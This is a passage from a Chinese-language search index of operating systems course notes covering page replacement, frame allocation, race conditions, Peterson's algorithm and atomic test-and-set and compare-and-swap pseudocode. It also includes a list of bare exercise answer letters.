<li>\u8fdb\u7a0b\u53ef\u80fd\u5f15\u7528\u4e00\u4e2a\u4e4b\u524d\u88ab\u91ca\u653e\u7684page\uff0c\u4f46\u662f\u90a3\u4e2apage\u8fd8\u672a\u88abflush\u673a\u5236\u9a71\u9010</li> </ul> <p>\u53ef\u7528\u5e27\u5217\u8868</p> <p>\u5728 demand paging \u7cfb\u7edf\u4e2d\uff0c\u9875\u662f\u52a8\u6001\u6620\u5c04\u5230\u5e27\u4e2d\u7684\uff0c\u6211\u4eec\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a\u53ef\u7528\u5e27\u5217\u8868\uff08free-frame list\uff09\u7528\u6765\u8bb0\u5f55\u5f53\u524d\u54ea\u4e9b\u5e27\u662f\u7a7a\u95f2\u7684</p> <p>\u200b\u200b</p> <p>\u5728\u7cfb\u7edf\u542f\u52a8\u540e\uff0c\u5c06\u6240\u6709\u53ef\u7528\u7684\u5e27\u90fd\u52a0\u5165free-frame list\uff0c\u5f53\u6709\u7528\u6237\u9700\u8981\u7269\u7406\u5185\u5b58\u7684\uff0c\u53d6\u51fa\u4e00\u9875\u5c06\u5176\u64e6\u9664\uff0c\u518d\u7ed9\u7528\u6237</p> <p>\u8fd9\u4e2a\u64e6\u9664\u884c\u4e3a\uff0c\u79f0\u4e3a zero-fill-on-deman</p> <p>free-frame buffer pool</p> <p>\u5982\u679c\u6211\u4eec\u603b\u662f\u7b49\u5f85 free-frame list \u4e3a\u7a7a\u7684\u65f6\u5019\u518d\u8fdb\u884c\u66ff\u6362\u7b56\u7565\uff0c\u4e0d\u53ef\u907f\u514d\u5730\u4f1a\u963b\u585e\u5f53\u524d\u8fdb\u7a0b\uff0c\u5bf9\u6b64\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u4e00\u4e9b\u65b9\u6cd5\u5728\u9632\u6b62\u963b\u585e</p> <ul> <li>\u5f15\u5165\u4e00\u4e2a\u62bd\u8c61\u7684buffer\uff0c\u4fdd\u8bc1 free-frame list \u603b\u662f\u6709\u4e00\u5b9a\u6570\u91cf\u7684\u7a7a\u95f2\u5e27\uff0c\u5c11\u4e8e\u8fd9\u4e2a\u5e27\u6570\u7684\u65f6\u5019\u5c31\u72ec\u7acb\u5730\u8fd0\u884c\u4e00\u4e2a\u66ff\u6362\u8fdb\u7a0b</li> <li>\u6216\u8005\u6211\u4eec\u662f\u7528\u4e00\u4e2a\u8d1f\u53cd\u9988\u63a7\u5236\uff0c\u7ef4\u62a4\u4e00\u4e2a\u4e0a\u754c\u548c\u4e0b\u754c\uff0c\u5f53free-frame\u6570\u91cf\u5c0f\u4e8e\u4e0b\u754c\u7684\u65f6\u5019\uff0c\u4e00\u7c7b\u53eb\u505a reapers \u7684\u5185\u6838\u4f8b\u7a0b\u5c31\u5f00\u59cb\u6267\u884c\u66ff\u6362\u7b56\u7565\uff0c\u76f4\u5230free-frame\u6570\u91cf\u89e6\u78b0\u4e0a\u754c</li> <li> <p>\u5982\u679cfree-frame\u975e\u5e38\u5c11\uff0c\u8fbe\u5230\u4e86\u4e00\u4e2a\u975e\u5e38\u4f4e\u7684\u754c\uff0c\u5c31\u51fa\u73b0\u4e86OOM\uff08out-of-memory\uff09\uff0c\u6b64\u65f6\u4e00\u4e2a\u53eb OOM killer \u7684\u8fdb\u7a0b\u5c31\u4f1a\u6740\u6b7b\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u817e\u51fa\u5185\u5b58\u7a7a\u95f4</p> </li> <li> <p>Linux\u4e2d\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u4e00\u4e2aOOM score\uff0cscore\u4e0e\u8fdb\u7a0b\u4f7f\u7528\u5185\u5b58\u7684\u767e\u5206\u6bd4\u6709\u5173\uff0c\u8c01\u5185\u5b58\u7528\u7684\u6700\u591a\u5c31\u6700\u6709\u53ef\u80fd\u88ab\u6740\u6b7b</p> </li> </ul>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#39-page-replacement-algorithms","title":"3.9 page replacement algorithms","text":"<p>\u7f6e\u6362\u7b56\u7565\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b</p> <ul> <li>\u4f7f\u7528\u7f6e\u6362\u7b97\u6cd5 replacement algorithm \u51b3\u5b9a\u54ea\u4e2aframe\u662fvictim frame</li> <li>\u5982\u679c\u6709\u5fc5\u8981\uff0c\u4f8b\u5982page\u4e3a\u810fpage\uff0c\u5219\u9700\u8981\u5c06 victim frame \u5199\u5165 \u540e\u5907\u5b58\u50a8</li> <li>\u66f4\u65b0\u76f8\u5173\u5143\u4fe1\u606f</li> <li>\u8fd4\u56de\u8fd9\u4e2a victim frame \u4f5c\u4e3a free-frame</li> </ul> <p>\u4e3a\u4e86\u68c0\u67e5\u8be5page\u662f\u5426\u88ab\u5199\u8fc7\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u4fee\u6539\u4f4d\uff08dirty bit \u6216\u8005 modified bit\uff09\u6765\u8bb0\u5f55\u9875\u662f\u5426\u88ab\u4fee\u6539\u8fc7\uff0c\u82e5\u6709\u5199\u884c\u4e3a\uff0c\u5219\u628adirty bit\u5199\u4e3a1</p> <p>\u968f\u540e\u6211\u4eec\u6765\u63a2\u8ba8\u4e00\u4e9b\u7f6e\u6362\u7b97\u6cd5</p> <p>OPT</p> <p>\u7406\u8bba\u4e0a\u6700\u4f18\u7684\u505a\u6cd5\uff0c\u5c31\u662f\u80fd\u6709\u6700\u4f4e\u7684 page fault rate\uff0c\u5c31\u662f\u5c06\u73b0\u5728\u80fd\u66ff\u6362\u7684\u9875\u4e2d\uff0c\u672a\u6765\u6700\u4e45\u65f6\u95f4\u4e0d\u4f1a\u8bbf\u95ee\u7684\u9875\u4f5c\u4e3a victim frame \u8fdb\u884c\u66ff\u6362</p> <p>\u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u4ec5\u4f5c\u4e3a\u7406\u8bba\u6700\u4f18\u8fdb\u884c\u5efa\u6a21\uff0c\u56e0\u4e3a\u5b9e\u9645\u5f88\u96be\u9884\u6d4b\u4e00\u4e2aframe\u4e0b\u4e00\u6b21\u4f7f\u7528\u5728\u4ec0\u4e48\u65f6\u5019</p> <p>FIFO</p> <p>\u5148\u8fdb\u5148\u51fa\u7b56\u7565\uff0c\u9009\u62e9\u6b63\u5728\u4f7f\u7528\u7684\uff0c\u6700\u65e9\u8fdb\u5165\u5185\u5b58\u7684frame\u4f5c\u4e3a victim frame\uff0c\u6211\u4eec\u5728\u5185\u5b58\u4e2d\u7ef4\u62a4\u4e00\u4e2aFIFO\u961f\u5217\u5c31\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <ul> <li>\u4f18\u70b9\u662f\u5b9e\u73b0\u7b80\u5355</li> <li>\u7f3a\u70b9\u662f\uff0c\u6700\u65e9\u8f7d\u5165\u7684frame\u4e5f\u53ef\u80fd\u662f\u9891\u7e41\u4f7f\u7528\u7684frame\uff0c\u8fd9\u4e2a\u5efa\u6a21\u4e0eOPT\u5e76\u4e0d\u76f8\u8fd1</li> </ul> <p>LRU</p> <p>Least recently used\uff0c\u5c31\u662f\u6700\u8fd1\u5f88\u4e45\u6ca1\u88ab\u7528\u8fc7\u7684page\u66ff\u6362\u51fa\u53bb\uff0cLRU\u5e38\u5e38\u88ab\u8ba4\u4e3a\u662f\u548cOPT\u8f83\u4e3a\u76f8\u8fd1\u7684\u5efa\u6a21\uff0c\u662f\u5e38\u7528\u7684replacement algorithm</p> <p>\u90a3\u4e48\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u5b9e\u73b0LRU</p> <p>\u6211\u4eec\u4e00\u822c\u628a\u4e0b\u9762\u4e24\u79cd\u7b97\u6cd5\u79f0\u4e3a stack algorithms</p> <ul> <li> <p>\u8ba1\u6570\u5668\uff0c\u4f7f\u7528\u4e00\u4e2a\u8ba1\u6570\u5668\u6765\u6807\u8bb0\u4e00\u4e2a\u5e27\u591a\u4e45\u6ca1\u88ab\u4f7f\u7528\u8fc7</p> </li> <li> <p>\u5f53\u4e00\u4e2aframe\u88ab\u4f7f\u7528\u7684\u65f6\u5019\u5c06\u8ba1\u6570\u5668\u5f52\u96f6</p> </li> <li>\u6bcf\u4e2a\u8ba1\u6570\u5668\u90fd\u8981\u5b9a\u671f\u66f4\u65b0</li> <li>\u9700\u8981\u8003\u8651\u8ba1\u6570\u5668\u6ea2\u51fa</li> <li>\u9700\u8981\u627e\u5230LRU\u7684\u90a3\u4e2aframe\u7684\u65f6\u5019\uff0c\u9700\u8981\u904d\u5386\uff0c\u6216\u8005\u6211\u4eec\u4f7f\u7528\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u53bb\u7ef4\u62a4frame\u5e8f\u5217</li> <li> <p>\u94fe\u8868\u5e8f\u5217\uff0c\u7528\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u6765\u7ef4\u62a4\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0cframe\u5728\u5e8f\u5217\u4e2d\u7684\u4f4d\u7f6e\u6765\u8868\u793a\u5b83\u4eec\u6700\u8fd1\u88ab\u4f7f\u7528\u7684\u65f6\u95f4\u987a\u5e8f</p> </li> <li> <p>\u5f53\u4e00\u4e2aframe\u88ab\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u5982\u679c\u5176\u5728\u94fe\u8868\u4e2d\uff0c\u5219\u5c06\u5176\u79fb\u52a8\u5230\u94fe\u8868\u5934\u90e8</p> </li> <li>\u82e5\u5176\u4e0d\u518d\u94fe\u8868\u4e2d\uff0c\u5219\u5c06\u5176\u52a0\u5165\u5230\u94fe\u8868\u5934\u90e8</li> <li>\u6b64\u65f6LRU\u7684frame\u603b\u5728\u5e8f\u5217\u672b\u5c3e</li> </ul> <p>\u7f3a\u70b9\u5728\u4e8e</p> <ul> <li>\u7ef4\u62a4\u6bcf\u4e2aframe\u7684clock\u663e\u7136\u662f\u8017\u8d39\u8d44\u6e90\u548c\u65f6\u95f4\u7684</li> <li>\u6bcf\u6b21\u5185\u5b58\u8bbf\u95ee\u90fd\u9700\u8981\u7ef4\u62a4\uff0c\u5f00\u9500\u5f88\u5927</li> <li>\u94fe\u8868\u5e8f\u5217\u4e2d\uff0c\u627e\u5230\u5bf9\u5e94\u7684frame\u4e5f\u5f88\u9ebb\u70e6</li> </ul> <p>LRU Approximation</p> <p>\u5b8c\u6574\u5730\u6267\u884cLRU\u7b97\u6cd5\u662f\u7f8e\u597d\u7684\uff0c\u4f46\u662f\u5b58\u5728\u8f83\u5927\u7684\u5f00\u9500\uff0c\u56e0\u6b64\u6211\u4eec\u5f80\u5f80\u4f1a\u91c7\u7528LRU\u7684\u8fd1\u4f3c\u7b97\u6cd5</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#310-allocatin-of-frames","title":"3.10 Allocatin of Frames","text":"<p>\u9996\u5148\uff0c\u5bf9\u4e8e\u5355\u4e2a\u8fdb\u7a0b\u800c\u8a00\uff0c\u5b58\u5728\u4e00\u4e2a\u8f83\u4e25\u683c\u7684\u4e0a\u4e0b\u754c</p> <ul> <li> <p>\u5206\u914d\u4e00\u4e2aprocess\u7684frames\u6570\u91cf\u4e0d\u80fd\u5927\u4e8efree-frame\u7684\u603b\u91cf</p> </li> <li> <p>the maximum number of frames per process is defined by the amount of available physical memory</p> </li> <li> <p>\u5206\u914d\u4e00\u4e2aprocess\u7684frames\u6570\u91cf\u4e0d\u80fd\u5c0f\u4e8e\u201c\u6267\u884c\u6bcf\u4e00\u6761\u6307\u4ee4\u6240\u9700\u8981\u6d89\u53ca\u7684frames\u201d</p> </li> <li> <p>the minimum number of frames per process is defined by architecture</p> </li> </ul> <p>\u200b\u200b</p> <p>\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u4e24\u79cd\u65b9\u5f0f</p> <ul> <li>global replacement \u4ece\u5168\u5c40\u7684frame list\u4e2d\u83b7\u53d6</li> <li>local replacement \u63d0\u524d\u89c4\u5b9a\u597d\u54ea\u4e9bframe\u7ed9\u54ea\u4e2a\u8fdb\u7a0b\uff0c\u4ece\u4e2d\u53bb\u5206\u914d</li> </ul> <p>\u5206\u914d\u7b97\u6cd5 frame-allocation  algorithm \u6309\u7167\u5206\u914d\u7684\u5e27\u5927\u5c0f\u6765\u4efd\uff0c\u4e3b\u8981\u6709\u90a3\u4e48\u51e0\u79cd</p> <p>\u200b\u200b</p> <p>\u5206\u914d\u5404\u6bcf\u4e2a\u8fdb\u7a0b\u7684frame\u6570\u91cf\u90fd\u662f\u4f1a\u52a8\u6001\u53d8\u5316\u7684</p> <p>\u5728\u591a\u6838\u8bbe\u8ba1\u4e0b\uff0c\u6709\u4e00\u79cd\u8bbe\u8ba1\u53eb\u505aNUMA\uff0c\u5728\u8fd9\u79cd\u8bbe\u8ba1\u4e2d\uff0c\u4e0d\u540c\u7684CPU\u90fd\u6709\u81ea\u5df1\u66f4\u5feb\u8bbf\u95ee\u7684\u5185\u5b58</p>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#311","title":"3.11 \u4e00\u4e9b\u72ec\u7acb\u7684\u77e5\u8bc6\u70b9","text":"<p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u6240\u6709\u7684\u66ff\u6362\u7b56\u7565\u90fd\u6709\u53ef\u80fdThrashing</li> </ul>"},{"location":"ZJU-course/OS/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/#_2","title":"\u4e60\u9898","text":"<p>\u738b\u9053</p> <p>\u200b\u200b</p> <ul> <li>\u5206\u6bb5\u5b58\u50a8\u4e0d\u4f1a\u4ea7\u751f\u5185\u90e8\u788e\u7247</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>A A</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>A</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>A</li> </ul> <p>\u200b\u200b</p> <ul> <li>C \u9875\u5f0f\u5b58\u50a8\u4e0d\u53ef\u9759\u6001\u91cd\u5b9a\u4f4d</li> </ul> <p>\u200b\u200b</p> <ul> <li>BC</li> </ul> <p>\u200b\u200b</p> <ul> <li>BB</li> </ul> <p>\u200b\u200b</p> <ul> <li>CB</li> </ul> <p>\u200b\u200b</p> <ul> <li> <p>DC</p> </li> <li> <p>\u865a\u62df\u5b58\u50a8\u5668\u7684\u6700\u5927\u5bb9\u91cf\u6709\u8ba1\u7b97\u673a\u7684\u5730\u8d28\u7ed3\u6784\u51b3\u5b9a</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>D B \u539f\u56e0\u90fd\u662f\u5185\u5b58\u4e0d\u591f</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <p>jjm</p> <ul> <li>\u5f53\u78c1\u76d8</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u865a\u62df\u5185\u5b58 \u90fd\u662f\u6267\u884c\u671f\u95f4\u5185\u5b58\u7ed1\u5b9a</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u51e0\u4e2a\u5b9a\u4f4d\u673a\u5236\u8981\u53bb\u770b\u770b</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/","title":"\u540c\u6b65\u548c\u6b7b\u9501","text":"<ul> <li>\u6bcf\u4e00\u79cd\u540c\u6b65\u65b9\u6cd5 \u5bf9\u4e8e CS \u6ee1\u8db3\u6761\u4ef6\u7684\u8bc1\u660e</li> <li>\u540c\u6b65\u5206\u6790\u548c\u94f6\u884c\u5bb6\u7b97\u6cd5\u53ef\u80fd\u8003\u5927\u9898</li> <li>\u54f2\u5b66\u5bb6\u8fdb\u9910\u95ee\u9898</li> <li>\u8981\u770b\u6e05\u94f6\u884c\u5bb6\u7b97\u6cd5\u8868\u683c\u4e0a\u7684\u6807\u9898</li> </ul>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#21","title":"2.1 \u540c\u6b65\u5de5\u5177","text":""},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#211","title":"2.1.1 \u7ade\u6001\u6761\u4ef6","text":"<p>\u867d\u7136\u5728\u7f16\u7a0b\u8bed\u8a00\u4e2d\u5bf9\u4e8e\u53d8\u91cf\u7684\u4fee\u6539\u5f80\u5f80\u8868\u73b0\u4e3a\u4e00\u4e2a\u8bed\u53e5\uff0c\u4f46\u662f\u5176\u5b9e\u4e0d\u662f\u4e00\u6b65\u5230\u4f4d\u7684\uff0c\u5176\u603b\u662f\u9700\u8981</p> <ul> <li>\u5c06\u5185\u5b58\u8bfb\u53d6\u5230\u5bc4\u5b58\u5668</li> <li>\u66f4\u65b0\u5bc4\u5b58\u5668</li> <li>\u5c06\u5bc4\u5b58\u5668\u66f4\u65b0\u7684\u503c\u5199\u5165\u5185\u5b58</li> </ul> <p>\u5982\u679c\u6709\u4e24\u4e2a\u8fdb\u7a0b\u540c\u65f6\u5bf9\u5185\u5b58\u4e2d\u7684\u4e00\u4e2a\u53d8\u91cf\u4fee\u6539\uff0c\u5c31\u4f1a\u53d1\u751f\u7ade\u4e89 Race Condition</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u4ece\u4e0a\u8ff0\u4e24\u5f20\u56fe\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u4e0d\u8bba\u662f\u5e76\u53d1\u8fd8\u662f\u591a\u9053\u7a0b\u5e8f\uff0cRace condition \u90fd\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u5bf9\u4e8eRace Condition\u6211\u4eec\u7684\u76ee\u7684\u662f\u907f\u514d\u8be5\u95ee\u9898\u7684\u51fa\u73b0</p> <p>\u6211\u4eec\u5c06\u8fd9\u79cd\u4f1a\u5f71\u54cd\u5176\u4ed6\u8fdb\u7a0b\u6216\u8005\u88ab\u5176\u4ed6\u8fdb\u7a0b\u5f71\u54cd\u7684\u8fdb\u7a0b\u79f0\u4e3a Cooperating Process</p>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#212-the-critical-section-problem","title":"2.1.2 The Critical-Section Problem","text":"<p>\u6211\u4eec\u5b9a\u4e49\u4e34\u754c\u8d44\u6e90Critical resource\uff0c\u662f\u6307\u90a3\u79cd\u53ea\u80fd\u7531\u4e00\u4e2a\u7528\u6237\u62e5\u6709\u7684\u8d44\u6e90\uff0c\u4f8b\u5982<code>mem[x]</code>\u200b</p> <p>\u7a0b\u5e8f\u4e2d\u8bbf\u95ee\u4e34\u754c\u8d44\u6e90\u7684\u4ee3\u7801\uff0c\u79f0\u4e3a Critical Section\uff0c\u7b80\u79f0CS</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Entry Section      \u2502 &lt;-- ask for &amp; wait for permission to enter CS\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Critical Section   \u2502 &lt;-- codes manipulating critical resources\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Exit Section       \u2502 &lt;-- release the critical resources\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Remainder Section  \u2502 &lt;-- other codes\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u200b\u200b</p> <p>For kernel code * \u8fd9\u4e00\u90e8\u5206\u6709\u5f85\u5b8c\u5584</p> <p>\u5728\u5185\u6838\u4ee3\u7801\u4e2d\u89e3\u51b3Critical Section Problem</p> <ul> <li>\u5bf9\u4e8e\u5355\u5904\u7406\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u7981\u6b62\u4e2d\u65ad\uff0c\u4fdd\u8bc1\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u8fd0\u884ckernel mode</li> <li>\u5bf9\u4e8e\u591a\u5904\u7406\u5668\uff0c\u6211\u4eec\u8981\u5b9e\u73b0\u62a2\u5360\u5185\u6838\u6216\u8005\u975e\u62a2\u5360\u5185\u6838</li> </ul> <p>Peterson's Algorithm</p> <p>\u8be5\u7b97\u6cd5\u53ea\u9488\u5bf9\u4e24\u4e2a\u8fdb\u7a0b\u7684Race condition</p> <pre><code>// `i` is 0 or 1, indicating current pid, while `j` is another pid.\nprocess(i) {\n    j = 1 - i;\n\n    READY[i] = true;                    // \u2510\n    TURN = j;                           // \u2502\n    while (READY[j] &amp;&amp; TURN == j) {}    // \u251c entry section\n        // i.e. wait until:             // \u2502\n        //  (1) j exits,                // \u2502\n        //  (2) j is slower, so it      // \u2502\n        //      should run now.         // \u2518\n\n    /* operate critical resources */    // - critical section\n\n    READY[i] = false;                   // - exit section\n\n    /* other things */                  // - remainder section\n}\n</code></pre> <p>\u6211\u4eec\u8fd9\u91cc\u6709\u4e24\u4e2a\u5171\u4eab\u53d8\u91cf</p> <ul> <li>\u200b<code>READY</code>\u200b \u6570\u7ec4\uff0c\u8868\u793a\u610f\u613f\uff0c\u8868\u8fbe\u4e86\u4e24\u4e2a\u8fdb\u7a0b\u60f3\u8981\u8fdb\u5165Critical Section\u7684\u610f\u613f</li> <li>\u200b<code>TURN</code>\u200b \u53d8\u91cf\uff0c\u8868\u793a\u901f\u5ea6\uff0c\u8c01\u5199<code>TURN</code>\u200b\u53d8\u91cf\u5feb\u8c01\u6709\u66f4\u4f18\u5148\u8fdb\u5165\u6743\u9650</li> </ul> <p>\u4f46\u662f\u8be5\u7b97\u6cd5\u5728\u73b0\u4ee3\u8ba1\u7b97\u673a\u7cfb\u7edf\u5185\u5e76\u4e0d\u89e3\u51b3\u95ee\u9898\uff0c\u539f\u56e0\u5728\u4e8e\u73b0\u4ee3\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u7f16\u8bd1\u4f18\u5316\uff08\u5728\u7f16\u8bd1\u5668\u7684\u89c6\u89d2\u4e2d\uff0c\u6211\u4eec\u72ec\u5360CPU\u548c\u5185\u5b58\uff09\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4<code>READY</code>\u200b\u548c<code>TURN</code>\u200b\u53d8\u91cf\u7684\u64cd\u4f5c\u987a\u5e8f\u5e76\u4e0d\u5982\u6211\u4eec\u6240\u9884\u6599\u7684\u90a3\u6837\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4e0a\u8ff0\u7b97\u6cd5\u5e76\u4e0d\u80fd\u5b8c\u6210\u4e92\u65a5</p> <p>\u4f46\u6211\u4eec\u4e5f\u6709\u529e\u6cd5\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\uff0c\u5c31\u662f\u901a\u8fc7memory barriers, \u8be5barrier\u4fdd\u8bc1\u5176\u4e4b\u524d\u7684 S/L \u6307\u4ee4\u5fc5\u987b\u5728\u5176\u4e4b\u540e\u7684 S/L \u4e4b\u524d\u5b8c\u6210\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898</p> <pre><code>    READY[i] = true;                    // \u2510\n    memory_barrier();                   // \u2502\n    TURN = j;                           // \u2502\n</code></pre> <p>Memory Model</p> <p>\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u67b6\u6784\u6709\u4e0d\u540c\u7684memory model\uff0c\u5176\u8868\u73b0\u4e3a\u4ee5\u4e0b\u4e24\u79cd\u5f62\u5f0f</p> <ul> <li>Strongly ordered \u8fdb\u7a0b\u5bf9\u5185\u5b58\u7684\u4fee\u6539\u7acb\u523b\u5bf9\u5176\u4ed6\u5904\u7406\u5668\u53ef\u89c1</li> <li>Weakly ordered \u4fee\u6539\u4e0d\u7acb\u5373\u53ef\u89c1</li> </ul> <p>Cache\u7684\u673a\u5236\u5c31\u53ef\u4ee5\u5bfc\u81f4Weakly ordered</p>"},{"location":"ZJU-course/OS/%E5%90%8C%E6%AD%A5%E5%92%8C%E6%AD%BB%E9%94%81/#213-hardware-instructions","title":"2.1.3 Hardware Instructions","text":"<p>\u66f4\u597d\u5730\u89e3\u51b3CS\u95ee\u9898\u7684\u65b9\u6cd5\uff0c\u5e94\u8be5\u662f\u5728\u786c\u4ef6\u4e0a\u5f15\u5165atomic\u64cd\u4f5c</p> <p>\u738b\u9053\u5c06\u201c\u5173\u4e2d\u65ad\u201d\u653e\u7f6e\u4e8e\u8be5\u90e8\u5206\uff0c\u5e76\u4e14\u8bf4\u660e\u4e86</p> <ol> <li>\u4e0d\u9002\u7528\u4e0e\u7528\u6237\u7a0b\u5e8f</li> <li>\u4e0d\u9002\u7528\u4e8e\u591aCPU</li> <li>\u7cfb\u7edf\u6548\u7387\u4f1a\u4e0b\u964d</li> </ol> <p>test and set</p> <p>\u8fd9\u662f\u7b2c\u4e00\u7c7b\u539f\u5b50\u6307\u4ee4\uff0c\u610f\u4e49\u5728\u4e8e\u7ef4\u62a4\u4e00\u4e2a\u539f\u5b50\u7684 0 / 1 \u53d8\u91cf</p> <pre><code>&lt;atomic&gt; test_and_set(bool * target) {\n    bool ret = *target;\n    *target = true;\n    return ret;\n}\n</code></pre> <p>\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u4e3a true \u5e76\u4e14\u83b7\u53d6\u5176\u4e4b\u524d\u7684\u503c\uff0c\u4e00\u65e6\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6210\u529f\u5c06\u8be5\u53d8\u91cf\u8bbe\u7f6e\u4e3a true\uff0c\u5176\u4ed6\u8fdb\u7a0b\u90fd\u9700\u8981\u7b49\u5f85\u8be5\u8fdb\u7a0b\u5c06\u5176\u8bbe\u7f6e\u4e3a false\uff0c\u5426\u5219test\u53ea\u4f1a\u83b7\u5f97 true</p> <pre><code>process(i) {\n    while ( test_and_set(&amp;LOCK) ) {}    // - entry section\n\n    /* operate critical resources */    // - critical section\n\n    LOCK = false;                       // - exit section\n\n    /* other things */                  // - remainder section\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4f3c\u4e4e\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u89e3\u51b3 CS \u95ee\u9898\uff0c\u4f46\u662f\u5728\u591a\u8fdb\u7a0b\u7684\u6761\u4ef6\u4e0b\uff0c\u662f\u53ef\u80fd\u51fa\u73b0\u9965\u997f\u7684\u60c5\u51b5\u7684\uff0c\u53ef\u4ee5P1\u548cP2\u4e0d\u65ad\u8f6e\u6d41\u83b7\u5f97LOCK\uff0c\u800cP3\u6b64\u65f6\u5c31\u6c38\u8fdc\u7b49\u5f85\u4e0b\u53bb\u4e86\uff08\u4e0a\u8ff0\u7b97\u6cd5\u4e2d\u54ea\u4e2a\u8fdb\u7a0b\u8fdb\u5165CS\u6bb5\u5b8c\u5168\u9760\u8fd0\u884c\u901f\u5ea6\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\u5176\u4e0d\u6ee1\u8db3 bound waiting</p> <p>\u6bd4\u8f83\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u89c4\u5212\u9501\u7684\u7ba1\u7406\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u8fdb\u7a0b\u7684\u8fd0\u884c\u901f\u5ea6</p> <pre><code>// `i` is process id in [0, n), where `n` is the count of related process. \nprocess(i) {\n    WAITING[i] = true;                                  // \u2510\n    while ( WAITING[i] &amp;&amp; test_and_set(&amp;LOCK) ) {}      // \u251c entry sec.\n                                                        // \u2502\n    WAITING[i] = false;                                 // \u2518\n\n    /* operate critical resources */                    // - critical sec.\n\n    // i.e. find next waiting process j                 // \u2510\n    j = (i + 1) % n;                                    // \u2502\n    while (i != j &amp;&amp; !WAITING[j]) {                     // \u251c exit sec.\n        j = (j + 1) % n;                                // \u2502\n    }                                                   // \u2502\n    // release j's LOCK or release whole LOCK           // \u2502\n    if (i == j)     LOCK = false;                       // \u2502\n    else            WAITING[j] = false;                 // \u2518\n\n    /* other things */                                  // - remainder sec.\n}\n</code></pre> <p>compare and swap</p> <p>\u8be5\u7c7b\u539f\u5b50\u6307\u4ee4\u7684\u8868\u8ff0\u5982\u4e0b\uff0c\u5f53\u76ee\u6807\u53d8\u91cf\u7684\u65e7\u503c\u6ee1\u8db3\u671f\u671b\u7684\u65f6\u5019\uff0c\u5c06\u5176\u66f4\u65b0\u4e3a\u65b0\u503c</p> <pre><code>&lt;atomic&gt; compare_and_swap(int * target, int expected, 